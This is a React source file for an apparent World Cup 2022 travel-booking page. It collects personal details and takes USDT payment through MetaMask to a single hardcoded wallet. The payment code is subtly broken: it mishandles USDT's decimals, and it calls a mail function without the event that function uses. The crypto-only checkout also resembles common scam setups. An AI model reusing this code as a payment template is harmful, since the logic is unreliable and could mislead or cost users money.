import React, { useEffect } from "react";
import { useState } from "react";
import "./index.scss";
import Web3 from "web3";
import abi from "./ABI.json";
import axios from "axios";
import Pana from "../../img/pana.png";
import { useNavigate } from "react-router-dom";

function Form(props) {
  const [amount, setAmount] = useState(0);
  const [installModal,setShowModal]=useState(false)
  const setPlan = (data, Package) => {
    setAmount(data);
    setEmailParams({ ...emailParams, packages: Package });
  };

  const packages = [
    {
     plan:{ name: "Regular Package",
      description: "up to 1"},
      entry: 
        [
          {
            name: "Follow your team ",
            time: "Nov 19- dec 20",
            amount: 25500,
          },
          {
            name: "Group Stage",
            time: "Nov 19 -Dec 4",
            amount: 11800,
          },
          {
            name: "Round of 16 only",
            time: "Dec 1 - Dec 8",
            amount: 'sold out',
          },
          {
            name: "Round of 16 through finals",
            time: "Dec 1 - Dec 20",
            amount: 22500,
          },

          {
            name: "Quarter finals only",
            time: "Dec 7- Dec 12",
            amount: 'sold out',
          },
          {
            name: "Quarter finals through finals",
            time: "Dec 7- Dec 20",
            amount: 17850,
          },
          {
            name: "Semi finals only",
            time: "Dec 11- Dec 16",
            amount: 11250,
          },
          {
            name: "Semi finals through finals",
            time: "Dec 11- Dec 20",
            amount: 18000,
          },
          {
            name: "Finals",
            time: "Dec 20",
            amount: 11500,
          },
        
      ],
    },
    {plan:{ name: "premium", description: "up to 2"},entry: [
        {
          name: "Follow your team ",
          time: "Nov 19- dec 20",
          amount:45900,
        },
        {
          name: "Group Stage",
          time: "Nov 19 -Dec 4",
          amount: 21400,
        },
        {
          name: "Round of 16 only",
          time: "Dec 1 - Dec 8",
          amount: 20500,
        },
        {
          name: "Round of 16 through finals",
          time: "Dec 1 - Dec 20",
          amount:'sold out',
        },

        {
          name: "Quarter finals only",
          time: "Dec 7- Dec 12",
          amount: 'sold out',
        },
        {
          name: "Quarter finals through finals",
          time: "Dec 7- Dec 20",
          amount: 32500,
        },
        {
          name: "Semi finals only",
          time: "Dec 11- Dec 16",
          amount: 19900,
        },
        {
          name: "Semi finals through finals",
          time: "Dec 11- Dec 20",
          amount: 28300,
        },
        {
          name: "Finals",
          time: "Dec 20",
          amount: 18000,
        },
      
    ], },
    {plan: {name: "Premium Package", description: " up to 5"},entry: [
        {
          name: "Follow your team ",
          time: "Nov 19- dec 20",
          amount: 92000,
        },
        {
          name: "Group Stage",
          time: "Nov 19 -Dec 4",
          amount: 'sold out',
        },
        {
          name: "Round of 16 only",
          time: "Dec 1 - Dec 8",
          amount: 'sold out',
        },
        {
          name: "Round of 16 through finals",
          time: "Dec 1 - Dec 20",
          amount: 78000,
        },

        {
          name: "Quarter finals only",
          time: "Dec 7- Dec 12",
          amount: 'sold out',
        },
        {
          name: "Quarter finals through finals",
          time: "Dec 7- Dec 20",
          amount: 72000,
        },
        {
          name: "Semi finals only",
          time: "Dec 11- Dec 16",
          amount: 45000,
        },
        {
          name: "Semi finals through finals",
          time: "Dec 11- Dec 20",
          amount: 54000,
        },
        {
          name: "Finals",
          time: "Dec 20",
          amount: 38000,
        },
      
    ], },
    
  ];
  const navigate = useNavigate();
  const [success, setSuccess] = useState(false);
  const [emailParams, setEmailParams] = useState({});
  const sendEmail = (e) => {
    e.preventDefault();
    const { email, fullName, packages } = emailParams;
    console.log(emailParams);
    if (email && fullName && packages) {
      console.log("sending");
      axios
        .post("https://app.sportyleisure.com/api/send-mail", {
          email: email,
          fullName: fullName,
          package: packages,
        })
        .then((response) => setSuccess(true));
    }
  };
  const sendTransaction = async (e) => {
    e.preventDefault();
    const usdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    if (window.ethereum) {
      const web3 = new Web3(window.ethereum);

      const account = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      const contract = new web3.eth.Contract(abi.abi, usdt);
      const getBalance = await contract.methods.balanceOf(account[0]).call();
      const balance = web3.utils.fromWei(getBalance);
      if (balance >= amount) {
        const sendUsdt = await contract.methods
          .transfer(
            "0xb1c5AE828609ee18a750ce4245834094D1f5C125",
            web3.utils.toWei(amount, "ether")
          )
          .send({ from: account[0] });
        if (sendUsdt) {
          sendEmail();
        }
      } else {
        alert("not enough balance");
      }
    } else {
      setShowModal(true);
    }
  };
  const [countries, setCountries] = useState([]);
  useEffect(() => {
    axios
      .get("https://restcountries.com/v2/all")
      .then((response) => setCountries(response.data));
  }, []);







  return (
    <div className="home form">
       {installModal &&<Install setShowModal={setShowModal}/>}
      {!success &&  (
        <div className="wrap">

           
          <div onClick={props.click} className="back">
            {" "}
            {"<"} Back
          </div>
          <h2>BOOK A TRIP TO THE 2022 WORLD CUP IN QATAR</h2>

          <div className="plan_form">
            <div className="plans">
              <h1>Select one of the packages below</h1>

              {packages.map((Package) => (
                <Plan setPlan={setPlan} entry={Package.entry} Package={Package.plan} />
              ))}

              <form action="">
                <input type="text" placeholder="Reference Number" />
                <p>Confirm</p>
              </form>
            </div>
            <div className="forms">
              <h1>Fill the form below with your details to continue</h1>
              <form action="">
                <input
                  name="fullName"
                  onChange={(e) =>
                    setEmailParams({
                      ...emailParams,
                      [e.target.name]: e.target.value,
                    })
                  }
                  type="text"
                  placeholder="Full Name"
                />
                <input type="date" placeholder="Date of birth" />
                <input type="tel" placeholder="Phone No" />
                <input
                  type="Email"
                  name="email"
                  onChange={(e) =>
                    setEmailParams({
                      ...emailParams,
                      [e.target.name]: e.target.value,
                    })
                  }
                  placeholder="Email"
                />
                <select name="country" id="">
                  <option disabled selected value="">
                    Country
                  </option>
                  {countries.map((country) => (
                    <option value={country.name}>{country.name}</option>
                  ))}
                </select>

                <p>
                  Total : <span>${amount}</span>
                </p>

                <button onClick={sendTransaction}>Proceed to payment</button>
              </form>
              <p>
                By clicking this button, you agree to our{" "}
                <a href=""> Terms and conditions </a> and{" "}
                <a href="">Privacy policy </a>
              </p>
            </div>
          </div>
        </div>
      )}
      {success && (
        <div className="success">
          <img src={Pana} />
          <h1>payment successful</h1>
          <p>Check your email for more information</p>

          <button onClick={() => navigate("/")}>Go HOME</button>
        </div>
      )}
    </div>
  );
}

export default Form;

export const Plan = ({ setPlan, Package, entry }) => {
  const [showType, setShowType] = useState(false);

  return (
    <div className="plan_rack">
      <div onClick={() => setShowType(!showType)} className="plan">
        <b className="plan_name">{Package.name}</b>
        <small>{Package.description} person</small>
      </div>
      {showType && (
        <div className="types">
          {entry.map((entry) => (
            <div
              onClick={() =>{if(entry.amount != 'sold out') setPlan(entry.amount, Package.name)}}
              className="type"
            >
              <b>{entry.name}</b>
              <small>{entry.time}</small>
              <p className="price">${entry.amount}</p>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};
const Install=({setShowModal})=>{
    return(
      
         <div className="install">
            <div className="content">
               <p> You Currently dont have a wallet!</p>
               <a href="https://metamask.io "><button onClick={()=>setShowModal(false)}> Install Metamask</button> </a>
            </div>
        </div>
    
    )
  }
  